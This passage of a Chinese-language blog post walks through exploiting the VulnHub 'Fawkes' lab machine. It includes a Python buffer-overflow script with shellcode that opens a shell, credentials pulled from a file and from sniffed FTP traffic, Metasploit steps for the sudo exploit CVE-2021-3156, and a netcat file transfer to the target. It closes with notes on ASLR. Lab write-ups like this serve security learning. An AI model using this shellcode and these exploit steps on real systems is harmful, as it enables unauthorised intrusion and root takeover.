+<p>要找到可执行权限的进程，然后<code>ESP-&gt;EIP</code>（个人理解：将ESP指令传给EIP）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png" /></p>
+<p>记住地址，写入payload的时候记得反过来！</p>
+<p>然后编写利用脚本： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\x1e\xfb\xfd&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>  + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure></p>
+<p>解释：</p>
+<ul>
+<li>最开始的<code>#! /usr/bin/python</code>：当我们输入<code>./exp.py</code>时，默认最开始<code>#!</code>中的执行；</li>
+<li><code>'\x90'*32*</code>：<code>\x90</code>空，读到该字节就会继续读取下一个。这是一个技巧，使程序更稳定。如果代码的字节很紧凑，可能执行过程不会按照预期，适当的插入null不会影响执行过程，反而能够使程序的运行更加稳定。</li>
+<li>不能用python3，否则会因为payload中既有字节又有字符而报错！</li>
+</ul>
+<p>接着：</p>
+<ol type="1">
+<li>启动服务</li>
+<li>监听4444端口</li>
+<li>执行该程序<code>./exp.py</code>或者<code>python exp.py</code>都可以，不过一定要确保服务开启</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170120.png" /></p>
+<p>接下来修改脚本，将IP地址改为<code>10.0.2.16</code>即可，然后执行该脚本，讲道理就能够获得靶机的shell。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170549.png" /></p>
+<h2 id="信息收集">2.5 信息收集</h2>
+<p>输入<code>/bin/sh -i</code>拿到可用的shell。要加`-i。</p>
+<p>当我发现该shell的IP时察觉到不对劲</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170810.png" /></p>
+<p>靶机的IP应该是<code>10.0.2.16</code>而不是<code>172.....</code>，并且网卡的名字也很奇怪，怀疑这可能是一个容器，查看根目录下的文件</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png" /></p>
+<p>确定了我们现在的shell是一个容器的shell。不管它，反正先收集信息就对了。</p>
+<p>首先，在当前目录下发现了一个可能是重要的文件<code>.mycreds.txt</code>，查看其内容： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HarrYp0tter@Hogwarts123</span><br></pre></td></tr></table></figure></p>
+<p>这看起来像是一个密码，不管三七二十一，先尝试一下ssh登录，两个端口的ssh都尝试一下，发现2222端口的登录成功了 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh harry@10.0.2.16 -p 2222</span><br></pre></td></tr></table></figure></p>
+<p>发现还是在容器内🤡，查看一下root目录里面的内容，发现了两个文件，内容分别为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br><span class="line"></span><br><span class="line">// horcrux1.txt # 这就是第一个flag，horcrux是哈利波特里面的魂器的意思</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure></p>
+<p>base64解码：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png" /></p>
+<p>需要关注的是<code>note.txt</code>中的内容，大致的意思是：有人尝试登录ftp服务器，但是出错了，要求我们用流量分析的方法找到那人是谁。</p>
+<p>利用工具<code>tcpdump</code>分析流量： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/sh <span class="comment"># 切换到root</span></span><br><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure></p>
+<p>过了一会开始有了数据包：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png" /></p>
+<p>前面的3个为tcp握手过程，注意红框中的信息：</p>
+<ul>
+<li>第一个红框：ftp的语法，USER后面跟的是要登录的用户名</li>
+<li>第二个红框：服务器要求对方输入密码</li>
+<li>第三个红框：ftp语法，PASS后面跟的是密码</li>
+<li>第四个红框：登陆失败</li>
+</ul>
+<p>又获得一个用户名和密码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: neville</span><br><span class="line">password: bL!Bsg3k</span><br></pre></td></tr></table></figure></p>
+<p>尝试登录另一个端口的ssh</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png" /></p>
+<p>登录成功，并且成功来到真实的靶机。</p>
+<h2 id="权限提升">2.6 权限提升</h2>
+<p>这次靶机的提权涉及到一个漏洞<code>CVE-2021-3156</code>，参考资料在[[#靶机信息]]中给出。msf中也存在可利用的代码。</p>
+<p>首先，先利用msf中的auxiliary模块登录ssh创建一个会话 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment"># 打开msfconsole</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOST 10.0.2.16</span><br><span class="line"><span class="built_in">set</span> username neville</span><br><span class="line"><span class="built_in">set</span> password bL!Bsg3k</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png" /></p>
+<p>然后执行下面命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search cve-2021-3156</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>但是提示失败了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png" /></p>
+<p>命名存在该漏洞，但是却失败了这是为什么呢。通过下载<a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>中的<code>expoit_nss.py</code>，查看其中源码（只列出部分） <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/bin/sudo&quot;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>注意其中的<code>SUDO_PATH</code>，我们查看靶机上sudo的路径如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png" /></p>
+<p>所以需要修改，然后exp就可以成功利用了。将修改之后的文件传给靶机 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机: nc -lvnp 4444 &gt; exp.py</span><br><span class="line">kali: nc 10.0.2.16 4444 &lt; cve-2021-3156Exp.py -w 1</span><br></pre></td></tr></table></figure></p>
+<p>提权成功！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png" /></p>
+<p>接着就可以查看剩下的两个flag了，一个在<code>/home/nevile/horcrux2.txt</code>，还有一个在<code>/root/horcrux3.txt</code>，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br><span class="line"></span><br><span class="line">// horcrux3.txt</span><br><span class="line">__     __    _     _                           _     _     </span><br><span class="line">\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ </span><br><span class="line"> \ \ / / _ \| |/ _` |/ _ \ &#x27;_ ` _ \ / _ \| &#x27;__| __| | / __|</span><br><span class="line">  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \</span><br><span class="line">   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/</span><br><span class="line">                                                           </span><br><span class="line">     _       __            _           _ </span><br><span class="line">  __| | ___ / _| ___  __ _| |_ ___  __| |</span><br><span class="line"> / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |</span><br><span class="line">| (_| |  __/  _|  __/ (_| | ||  __/ (_| |</span><br><span class="line"> \__,_|\___|_|  \___|\__,_|\__\___|\__,_|</span><br><span class="line">                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Hard</span><br><span class="line">Machine Name: Fawkes</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Fawkes machine &amp; defeated Voldemort.</span><br><span class="line">Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
+<p>将其中的base64编码的部分解码得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom</span><br><span class="line"></span><br><span class="line">// horcrux3.txxt</span><br><span class="line">8: VolDeMorT dEfeAted bY hArrY PoTTeR</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结">3 总结</h1>
+<p>该靶机的难度为高，我认为主要是涉及了许多关于二进制的渗透方法，其他攻击方法还是比较简单的。</p>
+<p>其次，还涉及了之前没有的FTP服务攻击技术。</p>
+<p>最后，通过抓包分析得到ssh用户名和密码也是非常新颖的。</p>
+<h2 id="aslr技术">3.1 ASLR技术</h2>
+<p>ASLR（Address Space Layout Randomization，地址空间随机化）技术通过加载程序的时候使用不固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
+<p>需要注意以下几点：</p>
+<ul>
+<li>它并不能解决漏洞，而是增加了利用漏洞的难度；</li>
+<li>它不追踪或报告漏洞</li>
+<li>不能对编译时没有开启ASLR支持的二进制文件提供保护</li>
+<li>不能避免被绕过</li>
+</ul>
+<p>通过对攻击者在进行缓冲区溢出攻击时所要用到的内存布局中的偏移做了随机化，ASLR 加大了攻击成功的难度，从而增强了系统的控制流完整性。</p>
+<p>在Linux中可以通过下面两条命令查看是否开启该功能： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2. sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure></p>
+<p><code>randomize_va_space</code>的值有三个： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Conservative Randomization</span><br><span class="line">2 = Full Randomization</span><br></pre></td></tr></table></figure></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BB%BC%E5%90%88/" rel="tag"># 综合</a>
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/FTP%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag"># FTP服务攻击</a>
+              <a href="/tags/%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" rel="tag"># 流量抓包分析</a>
+              <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-CVE-2021-3156/" rel="tag"># 堆溢出漏洞攻击:CVE-2021-3156</a>
+              <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" rel="tag"># 缓冲区溢出漏洞</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/" rel="prev" title="CISCN2019 华东南赛区 Web11">
+                  <i class="fa fa-chevron-left"></i> CISCN2019 华东南赛区 Web11
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">220k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:20</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js"></script>
+
+</body>
+</html>
